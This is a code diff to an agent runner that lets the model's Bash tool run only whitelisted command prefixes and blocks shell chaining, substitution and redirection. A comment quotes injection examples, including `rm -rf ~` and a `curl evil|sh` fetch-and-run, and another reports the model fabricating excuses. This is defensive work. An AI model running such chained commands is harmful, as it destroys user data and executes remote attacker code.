@@ -88,6 +88,20 @@ export interface AgentExecOptions {
   stdin?: Readable;
   /** Grace window for stream.return() propagation before resolving (ms). */
   returnGraceMs?: number;
+  /**
+   * Command prefixes (e.g. "monomind", "monoagentcli") the SDK's own Bash
+   * tool is allowed to run, on top of whatever toolSpecs were given. Real
+   * shell access is far more reliable for the model to actually use than a
+   * large custom MCP tool surface (observed directly: with only ~44
+   * mcp__org__* tools, the model frequently refused and fabricated an
+   * excuse rather than call one; the same requests reliably succeed via a
+   * plain `monomind ...`/`monoagentcli ...` Bash invocation). Still fully
+   * scoped, not a blanket Bash grant: canUseTool below only allows a Bash
+   * call whose command starts with one of these prefixes (after trimming
+   * leading whitespace) — everything else is denied exactly as before.
+   * undefined/[] = no Bash allowance, matching prior behavior exactly.
+   */
+  allowBashPrefixes?: string[];
 }
 
 interface Terminal {
@@ -431,13 +445,66 @@ export async function runAgentExec(opts: AgentExecOptions): Promise<number> {
   // default, not a laxer one: this narrows the SDK's own default-deny-all
   // down to exactly what was asked for, nothing broader.
   const allowedToolNames = new Set(tools.map((t) => `mcp__org__${t.name}`));
-  const canUseTool = async (toolName: string, input: Record<string, unknown>) =>
-    allowedToolNames.has(toolName)
-      ? { behavior: 'allow' as const, updatedInput: input }
-      : {
+  const bashPrefixes = opts.allowBashPrefixes ?? [];
+  // A prefix match on its own only checks the FIRST token — the whole
+  // string still runs through a real shell, so `monomind org list; rm -rf
+  // ~` or `` monomind org list `curl evil|sh` `` would pass a bare
+  // startsWith() check and then execute the injected part too. Reject any
+  // command containing shell metacharacters that could chain, substitute,
+  // or redirect beyond the single literal invocation the prefix implies.
+  //
+  // This has to match real bash quoting rules, not just "any of these
+  // characters anywhere" — a caller legitimately passing a JSON blob via
+  // `--json '{"goal":"grow revenue & cut costs"}'` (org create-json's own
+  // documented usage) has a bare `&` sitting right there, and inside single
+  // quotes bash treats it as fully literal, same as `;`, `|`, a backtick, or
+  // `>`/`<` — none of those are special there. Only three quoting states
+  // matter: inside single quotes NOTHING is special (not even backtick/$());
+  // inside double quotes only backtick and $( still trigger substitution;
+  // outside any quotes everything below is live.
+  const hasUnsafeShellSyntax = (cmd: string): boolean => {
+    let inSingle = false;
+    let inDouble = false;
+    for (let i = 0; i < cmd.length; i++) {
+      const c = cmd[i];
+      if (c === "'" && !inDouble) {
+        inSingle = !inSingle;
+        continue;
+      }
+      if (c === '"' && !inSingle) {
+        inDouble = !inDouble;
+        continue;
+      }
+      if (inSingle) continue; // fully literal — nothing below applies
+      if (c === '`') return true; // substitution — live even inside "..."
+      if (c === '$' && cmd[i + 1] === '(') return true; // $( ... ) — same
+      if (inDouble) continue; // ;,&,|,<,>,\n are literal inside "..."
+      if (c === ';' || c === '&' || c === '|' || c === '\n') return true;
+      if (c === '>' || c === '<') return true;
+      if (c === '<' && cmd[i + 1] === '(') return true; // redundant but explicit
+    }
+    return false;
+  };
+  const canUseTool = async (toolName: string, input: Record<string, unknown>) => {
+    if (allowedToolNames.has(toolName)) return { behavior: 'allow' as const, updatedInput: input };
+    if (toolName === 'Bash' && bashPrefixes.length > 0 && typeof input.command === 'string') {
+      const cmd = input.command.trimStart();
+      const matchesPrefix = bashPrefixes.some((p) => cmd === p || cmd.startsWith(`${p} `));
+      if (matchesPrefix && !hasUnsafeShellSyntax(cmd)) return { behavior: 'allow' as const, updatedInput: input };
+      if (matchesPrefix)
+        return {
           behavior: 'deny' as const,
-          message: `Tool "${toolName}" was not in the tool list this exec call was given.`,
+          message: 'Bash command contains shell metacharacters (;, &, |, `, $(, <() — only a single literal invocation is allowed, no chaining/substitution/redirection.',
         };
+    }
+    return {
+      behavior: 'deny' as const,
+      message:
+        toolName === 'Bash' && bashPrefixes.length > 0
+          ? `Bash is only allowed for commands starting with: ${bashPrefixes.join(', ')}.`
+          : `Tool "${toolName}" was not in the tool list this exec call was given.`,
+    };
+  };
 
   // This session's own tool list has no way to reach the real
   // mastermind:createorg skill (no settingSources, no `skills` SDK option,
